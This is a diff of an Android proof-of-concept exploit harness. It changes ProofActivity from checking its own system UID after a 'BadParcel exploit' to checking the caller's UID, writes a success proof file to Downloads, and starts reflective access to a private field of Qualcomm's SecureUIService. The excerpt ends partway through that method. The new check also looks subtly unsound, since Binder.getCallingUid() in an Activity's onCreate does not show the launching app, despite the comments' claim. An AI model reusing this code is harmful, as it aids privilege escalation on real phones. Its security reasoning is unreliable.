@@ -1,6 +1,7 @@
 package com.example.tzpoc;
 
 import android.app.Activity;
+import android.os.Binder;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Process;
@@ -11,49 +12,45 @@ import java.io.FileOutputStream;
 import java.io.PrintWriter;
 
 public class ProofActivity extends Activity {
-    private static final String TAG = "ProofActivity";
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
+        int callerUid = Binder.getCallingUid();  // 呼び出し元のUID
         int myUid = Process.myUid();
 
-        String msg = "[+] ProofActivity started. My UID=" + myUid;
-        Log.i(TAG, msg);
+        String msg = "[+] ProofActivity: myUid=" + myUid + ", callerUid=" + callerUid;
+        Log.i("ProofActivity", msg);
         MainActivity.appendLog(msg);
 
-        if (myUid == 1000) {
-            MainActivity.appendLog("[!!!] SUCCESS: Process running with SYSTEM UID (1000) !!!");
-            createProofFile();
+        if (callerUid == 1000) {
+            MainActivity.appendLog("[!!!] SUCCESS: Called from system (uid=1000)");
+            // 証跡ファイルを作成（システムが呼び出したことを証明）
+            try {
+                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+                if (!dir.exists()) dir.mkdirs();
+                File proof = new File(dir, "caller_is_system.txt");
+                try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
+                    pw.println("Caller UID: " + callerUid);
+                    pw.println("My UID: " + myUid);
+                    pw.println("Timestamp: " + new java.util.Date());
+                }
+                MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
+            } catch (Exception e) {
+                MainActivity.appendLog("[-] Failed to create proof: " + e.getMessage());
+            }
+
+            // システム権限でSecureUIリフレクションを試行（これも呼び出し元がシステムなので実行可能）
             attemptSecureUIReflection();
         } else {
-            MainActivity.appendLog("[!] UID=" + myUid + " (not system). Exploit may have failed.");
-            // 失敗しても証跡は残す（デバッグ用）
-            createProofFile();
+            MainActivity.appendLog("[!] Caller UID is " + callerUid + ", not system.");
         }
 
         finish();
     }
 
-    private void createProofFile() {
-        try {
-            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-            if (!dir.exists()) dir.mkdirs();
-            File proof = new File(dir, "uid_proof.txt");
-            try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
-                pw.println("Process UID: " + Process.myUid());
-                pw.println("Timestamp: " + new java.util.Date());
-                pw.println("BadParcel exploit status: " + (Process.myUid() == 1000 ? "SUCCESS" : "FAILED"));
-            }
-            MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
-        } catch (Exception e) {
-            MainActivity.appendLog("[-] Failed to create proof file: " + e.getMessage());
-        }
-    }
-
     private void attemptSecureUIReflection() {
-        MainActivity.appendLog("[*] Attempting SecureUI reflection from system context...");
+        MainActivity.appendLog("[*] Attempting SecureUI reflection (caller is system)...");
         try {
             Class<?> clazz = Class.forName("com.qualcomm.qti.services.secureui.SecureUIService");
             java.lang.reflect.Field contextField = clazz.getDeclaredField("context");
